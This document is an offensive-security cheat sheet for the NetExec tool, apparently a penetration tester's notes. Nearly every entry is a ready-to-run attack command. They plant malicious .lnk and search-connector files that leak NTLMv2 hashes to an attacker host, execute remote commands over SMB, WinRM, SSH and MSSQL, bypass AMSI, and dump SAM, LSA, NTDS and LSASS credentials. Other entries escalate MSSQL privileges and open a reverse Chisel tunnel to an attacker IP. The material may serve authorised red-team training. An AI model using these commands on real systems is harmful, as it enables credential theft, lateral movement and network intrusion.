# NetExec (nxc) — Execution & Credential Extraction

## Hash Stealing (Coercion via Shares)

### Slinky Module — LNK File Hash Capture [added: 2026-04]
- **Tags:** #nxc #Slinky #LNK #NTLMv2 #HashCapture #WritableShare #T1187
- **Trigger:** Writable share found; want to passively capture NTLM hashes from browsing users
- **Prereq:** Write access to target share; Responder/listener running on attacker
- **Yields:** NTLMv2 hashes of users who browse the share containing malicious .lnk file
- **Opsec:** Med
- **Context:** Drop malicious .lnk files in writable shares to capture NTLMv2 hashes when users browse.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M slinky -o SERVER=<ATTACKER_IP> NAME=desktop
  sudo responder -I tun0
  # Cleanup:
  nxc smb <target> -u <u> -p <p> -M slinky -o SERVER=<ATTACKER_IP> NAME=desktop CLEAN=YES
  ```

### Drop-SC Module — .searchConnector-ms Hash Capture [added: 2026-04]
- **Tags:** #nxc #DropSC #searchConnector #NTLMv2 #HashCapture #ExplorerCoercion #T1187
- **Trigger:** Writable share found; want auto-connecting hash capture when folder is browsed
- **Prereq:** Write access to target share; SMB listener running on attacker
- **Yields:** NTLMv2 hashes from Explorer auto-connecting to attacker SMB when folder is browsed
- **Opsec:** Med
- **Context:** Drop .searchConnector-ms file that auto-connects to attacker SMB when folder is browsed in Explorer.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M drop-sc -o URL=\\\\<ATTACKER_IP>\\secret SHARE=<share> FILENAME=connector
  # Cleanup:
  nxc smb <target> -u <u> -p <p> -M drop-sc -o CLEANUP=True FILENAME=connector
  ```

---

## Command Execution

### SMB Command Execution (CMD/PowerShell) [added: 2026-04]
- **Tags:** #nxc #SMBExec #CommandExec #RemoteExec #CMD #PowerShell #T1569.002
- **Trigger:** Admin on target; need to execute commands remotely via SMB
- **Prereq:** Local admin credentials on target; SMB port 445 open
- **Yields:** Command output from remote execution via SMB (CMD or PowerShell)
- **Opsec:** Med
- **Context:** Admin on target, execute commands via SMB.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -x "whoami"          # CMD
  nxc smb <target> -u <u> -p <p> -X "Get-Process"      # PowerShell
  ```

### WinRM Command Execution [added: 2026-04]
- **Tags:** #nxc #WinRM #PSRemoting #RemoteExec #RemoteManagement #T1021.006
- **Trigger:** User in Remote Management Users group; WinRM port 5985 open
- **Prereq:** Valid credentials; user in Remote Management Users; WinRM enabled on target
- **Yields:** Command output from remote WinRM execution (CMD or PowerShell)
- **Opsec:** Med
- **Context:** User in Remote Management Users group.
- **Payload/Method:**
  ```
  nxc winrm <target> -u <u> -p <p> -x "whoami"         # CMD
  nxc winrm <target> -u <u> -p <p> -X "Get-Process"    # PowerShell
  ```

### SSH Command Execution (with key) [added: 2026-04]
- **Tags:** #nxc #SSH #KeyAuth #RemoteExec #LinuxTarget #T1021.004
- **Trigger:** SSH port 22 open; have SSH key for target user
- **Prereq:** Valid SSH credentials or key file; SSH port 22 open on target
- **Yields:** Command output from remote SSH execution
- **Opsec:** Low
- **Context:** SSH access with key-based auth.
- **Payload/Method:** `nxc ssh <target> -u <u> -p <p> --key-file id_rsa -x "id"`

### Custom Exec Method + AMSI Bypass [added: 2026-04]
- **Tags:** #nxc #ExecMethod #mmcexec #atexec #smbexec #AMSIBypass #T1569.002
- **Trigger:** Default execution method detected by AV/EDR; need alternative or AMSI bypass
- **Prereq:** Local admin credentials on target; SMB access
- **Yields:** Command execution via alternative method (mmcexec, atexec, smbexec) with optional AMSI bypass
- **Opsec:** Med
- **Context:** Specify execution method (mmcexec, atexec, smbexec) and optionally bypass AMSI.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -x "whoami" --exec-method smbexec
  nxc smb <target> -u <u> -p <p> -X "Get-Process" --amsi-bypass amsi_bypass.ps1
  ```

---

## Credential Extraction

### SAM / LSA / NTDS Dump [added: 2026-04]
- **Tags:** #nxc #SAM #LSA #NTDS #CredentialDump #DCSyncAlternative #T1003
- **Trigger:** Admin access on target; need to dump local or domain credentials
- **Prereq:** Local admin (SAM/LSA) or domain admin (NTDS) credentials; SMB access
- **Yields:** Local SAM hashes, LSA secrets, or full NTDS.dit domain credential dump
- **Opsec:** High
- **Context:** Admin access — dump local or domain credentials.
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> --sam              # Local SAM hashes
  nxc smb <target> -u <u> -p <p> --lsa              # LSA secrets
  nxc smb <target> -u <u> -p <p> --ntds             # NTDS.dit via drsuapi
  nxc smb <target> -u <u> -p <p> --ntds vss         # NTDS.dit via VSS
  ```

### LSASS Memory Dump Modules [added: 2026-04]
- **Tags:** #nxc #LSASS #lsassy #procdump #nanodump #handlekatz #MemoryDump #T1003.001
- **Trigger:** Need to dump LSASS remotely; choosing method based on AV/EDR presence
- **Prereq:** Local admin credentials on target; SMB access
- **Yields:** LSASS memory contents (NTLM hashes, Kerberos tickets, plaintext passwords)
- **Opsec:** High
- **Context:** Dump LSASS remotely via various methods (choose based on AV/EDR).
- **Payload/Method:**
  ```
  nxc smb <target> -u <u> -p <p> -M lsassy          # pypykatz-based
  nxc smb <target> -u <u> -p <p> -M procdump         # sysinternals procdump
  nxc smb <target> -u <u> -p <p> -M handlekatz       # handlekatz
  nxc smb <target> -u <u> -p <p> -M nanodump          # nanodump (smallest footprint)
  ```

---

## MSSQL Attacks

### MSSQL Privilege Escalation (Standard → Sysadmin) [added: 2026-04]
- **Tags:** #nxc #MSSQL #mssql_priv #PrivEsc #Impersonation #sysadmin #T1078
- **Trigger:** Low-privilege MSSQL access; need to escalate to sysadmin
- **Prereq:** Valid MSSQL credentials; nxc installed
- **Yields:** sysadmin escalation via automated impersonation/link chain exploitation
- **Opsec:** Med
- **Context:** Low-priv MSSQL user — enumerate and exploit impersonation/link chains to escalate.
- **Payload/Method:**
  ```
  nxc mssql <target> -u <u> -p <p> -M mssql_priv                          # Enumerate
  nxc mssql <target> -u <u> -p <p> -M mssql_priv -o ACTION=privesc        # Exploit
  nxc mssql <target> -u <u> -p <p> -M mssql_priv -o ACTION=rollback       # Rollback
  ```

### MSSQL Command Execution [added: 2026-04]
- **Tags:** #nxc #MSSQL #CommandExec #xp_cmdshell #SQLExec #T1059
- **Trigger:** sysadmin on MSSQL; need OS command execution
- **Prereq:** sysadmin role on MSSQL or xp_cmdshell enabled
- **Yields:** OS command execution on MSSQL host
- **Opsec:** High
- **Context:** Have sysadmin or xp_cmdshell access.
- **Payload/Method:** `nxc mssql <target> -u <u> -p <p> -x "whoami"`

### MSSQL File Operations [added: 2026-04]
- **Tags:** #nxc #MSSQL #FileOps #FileTransfer #SQLShares #T1105
- **Trigger:** Need to read/write files via MSSQL share access
- **Prereq:** Valid MSSQL credentials with share access
- **Yields:** File transfer to/from target via MSSQL shares
- **Opsec:** Med
- **Context:** Read/write files via MSSQL shares.
- **Payload/Method:**
  ```
  nxc mssql <target> -u <u> -p <p> --share <share> --get-file <remote> <local>
  nxc mssql <target> -u <u> -p <p> --share <share> --put-file <local> <remote>
  ```

---

## Pivoting with Chisel via nxc

### Deploy Chisel Tunnel via nxc Exec [added: 2026-04]
- **Tags:** #nxc #Chisel #SOCKSProxy #Pivoting #TunnelDeploy #NetworkPivot #T1090
- **Trigger:** Need SOCKS proxy through compromised host for pivoting to internal network
- **Prereq:** Admin credentials on target; Chisel binary staged on target; nxc exec access
- **Yields:** SOCKS proxy through compromised host for pivoting to internal network segments
- **Opsec:** Med
- **Context:** Use nxc to deploy chisel on target for SOCKS pivoting.
- **Payload/Method:**
  ```
  # Method 1: Attack host = chisel server
  chisel server --reverse
  nxc smb <target> -u <u> -p <p> -x "C:\Windows\Temp\chisel.exe client <ATTACKER_IP>:8080 R:socks"

  # Method 2: Target = chisel server
  nxc smb <target> -u <u> -p <p> -x "C:\Windows\Temp\chisel.exe server --socks5"
  chisel client <TARGET_IP>:8080 socks
  ```
